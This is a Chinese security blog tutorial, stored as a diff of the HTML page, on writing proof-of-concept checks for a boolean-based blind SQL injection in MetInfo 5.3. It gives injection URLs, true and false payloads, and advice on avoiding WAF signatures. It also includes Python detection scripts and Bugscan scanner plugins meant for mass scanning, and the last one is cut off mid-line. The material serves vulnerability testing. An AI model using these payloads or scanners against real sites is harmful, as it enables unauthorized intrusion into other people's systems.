@@ -1,0 +1,869 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>
+
+
+    <meta name="description" content="不是路人甲的闲人丁,娱乐型选手" />
+
+
+
+  <meta name="keywords" content="PoC," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
+
+
+<meta name="description" content="2.3 基于布尔的盲注的 SQL 注入 PoC 编写这次我们选择的漏洞为 MetInfo 5.3 /include/global/listmod.php SQL 注入漏洞。
+2.3.1 漏洞分析想看原文分析的可以点上面的链接去研究，你别看我的标题和原文作者的不一样，内容其实是一样的。
+
+原文中的分析不是太详细，但是呢，我暂时不想详解这个漏洞，后面再看吧，如果有需要的话。
+
+根据原文中分析我们知道了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 中篇)">
+<meta property="og:url" content="http://blog.evalbug.com/2016/01/27/poc_coding_3/index.html">
+<meta property="og:site_name" content="Medici.Yan's Blog">
+<meta property="og:description" content="2.3 基于布尔的盲注的 SQL 注入 PoC 编写这次我们选择的漏洞为 MetInfo 5.3 /include/global/listmod.php SQL 注入漏洞。
+2.3.1 漏洞分析想看原文分析的可以点上面的链接去研究，你别看我的标题和原文作者的不一样，内容其实是一样的。
+
+原文中的分析不是太详细，但是呢，我暂时不想详解这个漏洞，后面再看吧，如果有需要的话。
+
+根据原文中分析我们知道了">
+<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-6.png">
+<meta property="og:image" content="http://blog.evalbug.com/images/poc_coding_img/2-7.png">
+<meta property="og:updated_time" content="2016-04-09T14:49:02.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 中篇)">
+<meta name="twitter:description" content="2.3 基于布尔的盲注的 SQL 注入 PoC 编写这次我们选择的漏洞为 MetInfo 5.3 /include/global/listmod.php SQL 注入漏洞。
+2.3.1 漏洞分析想看原文分析的可以点上面的链接去研究，你别看我的标题和原文作者的不一样，内容其实是一样的。
+
+原文中的分析不是太详细，但是呢，我暂时不想详解这个漏洞，后面再看吧，如果有需要的话。
+
+根据原文中分析我们知道了">
+<meta name="twitter:image" content="http://blog.evalbug.com/images/poc_coding_img/2-6.png">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 中篇) | Medici.Yan's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?35fe43c56e8a4a68a6a2ae899b9028fb";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        bp.src = '//push.zhanzhang.baidu.com/push.js';
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Medici.Yan's Blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu menu-left">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br />
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-next-about"></i> <br />
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br />
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            <i class="menu-item-icon icon-next-categories"></i> <br />
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br />
+            归档
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <form class="site-search-form" >
+  <input type="text" id="ts-search-input" class="menu-search-input">
+</form>
+<script>
+  var option = {
+    engineKey: 'c9b47bfaa23404adf331'
+  };
+  (function(w,d,t,u,n,s,e){
+    s = d.createElement(t);
+    s.src = u;
+    s.async = 1;
+    w[n] = function(r){
+      w[n].opts = r;
+    };
+    e = d.getElementsByTagName(t)[0];
+    e.parentNode.insertBefore(s, e);
+  })(window,document,'script','//tinysou-cdn.b0.upaiyun.com/ts.js','_ts');
+  _ts(option);
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              PoC 编写指南(第 2 章 SQL 注入类 PoC 编写 中篇)
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2016-01-27T20:00:48+08:00" content="2016-01-27">
+            2016-01-27
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/PoC/" itemprop="url" rel="index">
+                  <span itemprop="name">PoC</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2016/01/27/poc_coding_3/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2016/01/27/poc_coding_3/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><h2 id="2-3-基于布尔的盲注的-SQL-注入-PoC-编写"><a href="#2-3-基于布尔的盲注的-SQL-注入-PoC-编写" class="headerlink" title="2.3 基于布尔的盲注的 SQL 注入 PoC 编写"></a>2.3 基于布尔的盲注的 SQL 注入 PoC 编写</h2><p>这次我们选择的漏洞为 <a href="http://www.wooyun.org/bugs/wooyun-2015-0119166" target="_blank" rel="external">MetInfo 5.3 /include/global/listmod.php SQL 注入漏洞</a>。</p>
+<h3 id="2-3-1-漏洞分析"><a href="#2-3-1-漏洞分析" class="headerlink" title="2.3.1 漏洞分析"></a>2.3.1 漏洞分析</h3><p>想看原文分析的可以点上面的链接去研究，你别看我的标题和原文作者的不一样，内容其实是一样的。</p>
+<blockquote>
+<p>原文中的分析不是太详细，但是呢，我暂时不想详解这个漏洞，后面再看吧，如果有需要的话。</p>
+</blockquote>
+<p>根据原文中分析我们知道了，存在 SQL 注入的文件是 /include/global/listmod.php , 存在注入的变量是 $serch_sql。</p>
+<p>在 listmod.php 文件 200 行的位置拼接了 SQL 语句，在拼接 SQL 语句之前，对 $serch_sql 变量进行了初始化操作，但是呢，控制它是否初始化的另一个变量为 $imgproduct。</p>
+<p>当这个 $imgproduct 变量非 search 的任意字符的时候，导致 $serch_sql 不能进行初始化，从而可以自定义 $serch_sql 进行注入。</p>
+<a id="more"></a>
+<p>阅读原文后我们得到了目标 URL,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=123qweasd&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure>
+<p>存在注入的参数是 search_sql 注入的类型是 Boolean-Based Blind。</p>
+<h3 id="2-3-2-漏洞复现"><a href="#2-3-2-漏洞复现" class="headerlink" title="2.3.2 漏洞复现"></a>2.3.2 漏洞复现</h3><p>手工复现漏洞对学习可是很有帮助的。不管你信不信，我反正是信了。</p>
+<p>本地搭建 MetInfo 环境, 下载地址<a href="http://pan.baidu.com/s/1o6TvPwA" target="_blank" rel="external">Metinfo5.3下载地址</a></p>
+<p>读者下载完安装包后，进行安装，具体安装步骤在此处不再赘述。</p>
+<p>笔者安装完毕后网站的地址为: <a href="http://127.0.0.1/MetInfo/" target="_blank" rel="external">http://127.0.0.1/MetInfo/</a></p>
+<p>访问安装后的地址，如果正常访问，那就代表安装成功，我们可以继续后面的步骤了。</p>
+<blockquote>
+<p>这里要强调一点,如果你是 Linux 系统，那么 Web 容器对目录与文件名的大小写是敏感的，笔者建议直接目录在创建的时候用小写</p>
+</blockquote>
+<p>根据原漏洞详情的描述，我们直接访问:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/MetInfo/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=123qwe&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure>
+<p><img src="/images/poc_coding_img/2-6.png" alt="2-6"></p>
+<p>注意看图中业界资讯下方的条目</p>
+<p>好啦，然后我们给 search_sql 的参数后加一个单引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/MetInfo/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=123qwe&apos;&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure>
+<p><img src="/images/poc_coding_img/2-7.png" alt="2-7"></p>
+<p>图中业界资讯下方一条记录也没有了。</p>
+<p>于是我们得出一个结论存在 SQL 注入。那么我们再想一下，我们怎么判断存在 SQL 注入的呢？</p>
+<blockquote>
+<p>先请求正常的页面（也就是上面的第一个链接），然后再请求带单引号的页面（也就是上面的第二个链接），如果两次结果不一样，就判断存在注入了。</p>
+</blockquote>
+<p>看起来是这样的，对吧？实际上呢，上面说的话不是很严谨。</p>
+<p>我们验证 SQL 注入的时候，一定一定一定是<strong>为了证明我们输入的字符被当作 SQL 指令执行了</strong>。</p>
+<p><strong>如果我们只用上面这两个链接来判断存在注入的话，这误报率简直高到没边了。仔细思考一下为什么。</strong></p>
+<blockquote>
+<p>在实际中，是非常之复杂的，我们试想一下，假设有一个网站，它装了一个 WAF, 当你请求第一个没单引号的链接的时候，它返回的是正常的页面，然后，当你请求中带了一个单引号的时候，WAF 给你拦了，然后返回了一个请不要注入的提示的页面出来。</p>
+</blockquote>
+<p>妥妥的误报。是吧？这样我们就得修改一下这个两个请求了。</p>
+<p>我们看一下这个请求的 SQL 语句是什么样子的:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM met_news 123qwe where lang=&apos;cn&apos;  and (recycle=&apos;0&apos; or recycle=&apos;-1&apos;) and (( class1=&apos;2&apos;  and class2=&apos;5&apos; ) ) and displaytype=&apos;1&apos; and addtime&lt;=&apos;2015-12-29 17:59:20&apos;  order by top_ok desc,no_order desc,updatetime desc,id desc LIMIT 0, 8</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>上面这个你可以通过 tcpdump 抓包来得到，也可以通过修改网站源代码的方式，在查询前打印 SQL 语句，两种方法都可以，看个人喜好了</p>
+</blockquote>
+<p>看到上面的 SQL 语句之后，我直接把对应的 Payload 也贴出来。这里我为了省流量我只贴重点部分</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 返回有数据的页面</span><br><span class="line">serch_sql=123qwe where 4343=4343 -- x&amp;imgproduct=xxxx</span><br><span class="line"># 返回无数据的页面</span><br><span class="line">serch_sql=123qwe where 4343=4342 -- x&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure>
+<p>解释一下后面的 <code>-- x</code> ，这个是 Mysql 的注释，后面的 x 是为了让读者看清楚两个横线后面是有个空格的。</p>
+<p>对比两个 Payload, 发现唯一的差别就是 4343=4343 和 4343=4342 了,当然这里的这个数字嘛，随便写的，以前大家都喜欢用 1＝1, 1=2 这种来测试，那么有些 WAF 自然也是把这个加入到其特征里面喽，所以建议不要用这种。两者其实功能上都是一样的。</p>
+<p>然后要详细说一下为什么要这样请求了。第一个 4343=4343 表达式返回的肯定是为真的，那么是会有数据的，而 4343=4342 这显然是不相等的，所以第二个 SQL 语句肯定是没有数据的。那么我们就可以对比两次请求的结果来判断是不是存在注入了。</p>
+<p><strong>思考一下，这与前面说的两种请求方式有什么不同</strong></p>
+<blockquote>
+<p>WAF。没错，我们两次请求的 Payload 也只有数字这里不同，如果说目标有 WAF 的话（比方说这个 WAF 拦的是 where 这个关键字），那么我们两次请求的结果都会是被拦截的页面。</p>
+</blockquote>
+<p>于是我们要请求的两个链接就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 返回有数据的页面</span><br><span class="line">http://127.0.0.1/MetInfo/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=123qwe where 4343=4343 -- x&amp;imgproduct=xxxx</span><br><span class="line"></span><br><span class="line"># 返回无数据的页面</span><br><span class="line">http://127.0.0.1/MetInfo/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=123qwe where 4343=4342 -- x&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure>
+<p>那意思是说，我们现在就可以编写 PoC 了？打住。如果这个时候急着写 PoC，还是考虑的不够深入。</p>
+<p>把视线再移到 GET 参数上面，我们看到除了 serch_sql 和 imgproduct 两个参数之外，还有 lang 和 class2 这两个参数。试着删除掉这两个参数看看结果发现这两个参数其实是必不可少的，同时，也会影响页面访问结果。</p>
+<ul>
+<li><code>lang</code>  网站语言环境，我们测试安装的时候语言环境是 cn，但是你不能说所有的网站的语言都支持 cn。</li>
+<li><code>class2</code> 这个参数是<strong>二级栏目</strong>, 取值也是相应的二级栏目的 id。我们测试的时候，栏目的 id 用的是 5，对应的测试数据是 “业界资讯”，那么问题来了，所有的 MetInfo 二次开发的站都会有 id 等于 5 的这个栏目吗？显然不是。</li>
+<li><p>如果我们选择的这个栏目下，本来就没有数据呢，即使存在注入也会被判断成没注入吧？好在这个漏洞中返回的新闻列表是所有分类的新闻</p>
+<blockquote>
+<p>当然，如果这个站真的一条新闻都没有的话，就不能通过 Boolean-Based Blind 这种类型来注入了。那自然就不在本节的讨论范围之内了。</p>
+</blockquote>
+</li>
+</ul>
+<p>OK, 终于可以整理验证的思路了。</p>
+<ol>
+<li>访问 /news/ 获取到真实的栏目 id 和 lang</li>
+<li>带上返回值为 True 的 Payload 即：<code>serch_sql=123qwe where 4343=4343 -- x&amp;imgproduct=xxxx</code></li>
+<li>带上返回值一定为 False 的 Payload 即：<code>serch_sql=123qwe where 4343=4342 -- x&amp;imgproduct=xxxx</code></li>
+<li>比较 2, 3 中的新闻列表处的数据是否有变化，如果 2 有数据而 3 无数据，就证明存在注入。</li>
+</ol>
+<p>上面说的这些，都是一些小细节，除了 SQL 注入 Payload 构造的技巧之外，还应该要结合具体的 CMS 的一些特点。这样 PoC 用来批量扫描的时候才不会出太多问题。 </p>
+<p>既然说到应该结合整个 CMS 具体的一些特点的话，我们观察在访问 /news/index.php 的时候，在正文部分其实是有一部分数据的，那么这两者之前肯定是存在调用的，我们访问下面地址看看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 1. 1234＝1234</span><br><span class="line">http://127.0.0.1/MetInfo/news/index.php?serch_sql= 123qwe where 1234=1234 -- x&amp;imgproduct=xxxx</span><br><span class="line"></span><br><span class="line"># 2. 1234=1235</span><br><span class="line">http://127.0.0.1/MetInfo/news/index.php?serch_sql= 123qwe where 1234=1235 -- x&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>访问上面两个链接之后发现，第一个请求的响应页面中有数据，而第二个请求的响应页面中没有数据</p>
+</blockquote>
+<p>怎么样？这不就达到我们一开始想说的了效果了吗？这时完全可以不考虑 class2 的值是什么了呀。<strong>突然觉得之前折腾了那么久全是白费力气，这感觉真酸爽。</strong></p>
+<p>所以说洞主给的方案不一定是唯一的，PoC 编写的时候做一下必要的分析还是能减少很多无用功的。</p>
+<h3 id="2-3-3-无框架-PoC-编写"><a href="#2-3-3-无框架-PoC-编写" class="headerlink" title="2.3.3 无框架 PoC 编写"></a>2.3.3 无框架 PoC 编写</h3><p>我直接上 python 脚本吧，我也没统一处理输入输出什么的，因为这些都不是重点。</p>
+<p>代码<code>2_3_1.py</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(url)</span>:</span></span><br><span class="line">    payloadtrue = <span class="string">"&#123;target&#125;/news/index.php?"</span>\</span><br><span class="line">        <span class="string">"serch_sql=%20123qwe%20"</span>\</span><br><span class="line">        <span class="string">"where%201234%3D1234%20--%20x&amp;imgproduct=xxxx"</span>.format(target=url)</span><br><span class="line"></span><br><span class="line">    payloadfalse = <span class="string">"&#123;target&#125;/news/index.php?"</span>\</span><br><span class="line">        <span class="string">"serch_sql=%20123qwe%20"</span>\</span><br><span class="line">        <span class="string">"where%201234%3D1235%20--%20x&amp;imgproduct=xxxx"</span>.format(target=url)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req = urllib2.Request(payloadtrue)</span><br><span class="line">        resp = urllib2.urlopen(req)</span><br><span class="line">        <span class="keyword">if</span> resp.code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        data_true = resp.read()</span><br><span class="line">        <span class="comment"># 如果第一次请求没数据,说明可能是被 WAF 拦了或者是真的没数据</span></span><br><span class="line">        <span class="comment"># 又或者是自己定制了一个 404 的页面(返回码是 200)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">r'href=["\' ]shownews\.php\?lang='</span>, data_true, re.M):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        req = urllib2.Request(payloadfalse)</span><br><span class="line">        resp = urllib2.urlopen(req)</span><br><span class="line">        <span class="keyword">if</span> resp.code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        data_false = resp.read()</span><br><span class="line">        <span class="comment"># 第二次请求有数据的话，就说明不存在漏洞</span></span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r'href=["\' ]shownews\.php\?lang='</span>, data_false, re.M):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"%s is vulnerable!"</span> % url</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    verify(url=<span class="string">"http://127.0.0.1/MetInfo/"</span>)</span><br></pre></td></tr></table></figure>
+<p>上面的脚本在注释中已经把判断的逻辑写的很清楚了，也没什么要说的地方。</p>
+<p>值得一提的是：我们在判断的时候，选取的判断字符串一定要能区分这两个页面，并且要有一定的通用性。除了以上这些，还应该尽可能的复杂一些，这样在全网扫的时候误报率相对就低了下来。</p>
+<blockquote>
+<p>当然还可以通过返回包的大小来判断，但是如果仅仅靠这个来判断的话，误报率是比较高的。</p>
+</blockquote>
+<p>我们运行一下<code>2_3_1.py</code>看看效果吧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  2-3  python 2_3_1.py</span><br><span class="line">http://127.0.0.1/MetInfo/ is vulnerable!</span><br></pre></td></tr></table></figure>
+<h3 id="2-3-4-基于-Bugscan-框架的扫描插件编写"><a href="#2-3-4-基于-Bugscan-框架的扫描插件编写" class="headerlink" title="2.3.4 基于 Bugscan 框架的扫描插件编写"></a>2.3.4 基于 Bugscan 框架的扫描插件编写</h3><p>Bugscan 要求是使用官方 sdk 中给出的 curl 来发送 http 请求，我直接贴上代码</p>
+<p>代码 <code>2_3_2.py</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def assign(service, arg):</span><br><span class="line">    if service == &quot;metinfo&quot;:</span><br><span class="line">        return True, arg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def audit(arg):</span><br><span class="line">    verify(arg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def verify(url):</span><br><span class="line">    payloadtrue = &quot;&#123;target&#125;/news/index.php?&quot;\</span><br><span class="line">        &quot;serch_sql=%20123qwe%20&quot;\</span><br><span class="line">        &quot;where%201234%3D1234%20--%20x&amp;imgproduct=xxxx&quot;.format(target=url)</span><br><span class="line"></span><br><span class="line">    payloadfalse = &quot;&#123;target&#125;/news/index.php?&quot;\</span><br><span class="line">        &quot;serch_sql=%20123qwe%20&quot;\</span><br><span class="line">        &quot;where%201234%3D1235%20--%20x&amp;imgproduct=xxxx&quot;.format(target=url)</span><br><span class="line">    try:</span><br><span class="line">        code, head, body, errcode, redirect_url = curl.curl2(payloadtrue)</span><br><span class="line">        if code != 200 or not\</span><br><span class="line">                re.search(&apos;href=[&quot;\&apos; ]shownews\.php\?lang=&apos;, body, re.M):</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        code, head, body, errcode, redirect_url = curl.curl2(payloadfalse)</span><br><span class="line">        if code != 200 or\</span><br><span class="line">                re.search(&apos;href=[&quot;\&apos; ]shownews\.php\?lang=&apos;, body, re.M):</span><br><span class="line">            return</span><br><span class="line">        security_hole(&quot;%s&quot; % (payloadtrue))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    from dummy import *</span><br><span class="line">    audit(assign(&apos;metinfo&apos;, &apos;http://127.0.0.1/MetInfo/&apos;)[1])</span><br></pre></td></tr></table></figure>
+<p>对比下无框架的 PoC, 是不是觉得基本什么都没变呢，只是换了个入口和修改了一下发送的请求的方式而已。</p>
+<p>本地运行一下看下结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  2-3  python 2_3_2.py</span><br><span class="line">[LOG] &lt;hole&gt; http://http://127.0.0.1/MetInfo//news/index.php?serch_sql=%20123qwe%20where%201234%3D1234%20--%20x&amp;imgproduct=xxxx</span><br></pre></td></tr></table></figure>
+<p>另外要提的一点，在我写的时候 Bugscan 平台上已经有人编写过这个插件了。</p>
+<p>我也顺便把该作者的代码贴到下方，方便读者参考学习(侵权删)。</p>
+<blockquote>
+<p>看之前我还是提一下吧，我简单修正了一下原作者的代码风格。</p>
+<p>我们在写代码的时候一定要养成一个好习惯，Python 遵循的是 PEP8 规范，<br>这样自己看起来也会爽的很多。另外，不要在代码中留下太多无用的调试代码。</p>
+</blockquote>
+<p>代码 <code>2_3_3.py</code> <a href="http://q.bugscan.net/t/1484" target="_blank" rel="external">metinfo v5.3.1 news.php sql盲注</a>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env</span><br><span class="line"># *_* coding: utf-8 *_*</span><br><span class="line"></span><br><span class="line"># name: MetInfo V5.3.1 news.php sql注入</span><br><span class="line"># author: yichin</span><br><span class="line"># refer: http://www.wooyun.org/bugs/wooyun-2015-0119166</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def assign(service, arg):</span><br><span class="line">    if service == &apos;metinfo&apos;:</span><br><span class="line">        return True, arg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def audit(arg):</span><br><span class="line">    # 获取classid</span><br><span class="line">    code, head, res, err, _ = curl.curl2(arg + &apos;/news/&apos;)</span><br><span class="line">    if code != 200:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    m = re.search(r&apos;(/news.php\?[a-zA-Z0-9&amp;=]*class[\d]+=[\d]+)[\&apos;&quot;]&apos;, res)</span><br><span class="line">    if m is None:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    # 注入点</span><br><span class="line">    # 条件真</span><br><span class="line">    payload = arg + &apos;news&apos; + m.group(1) + 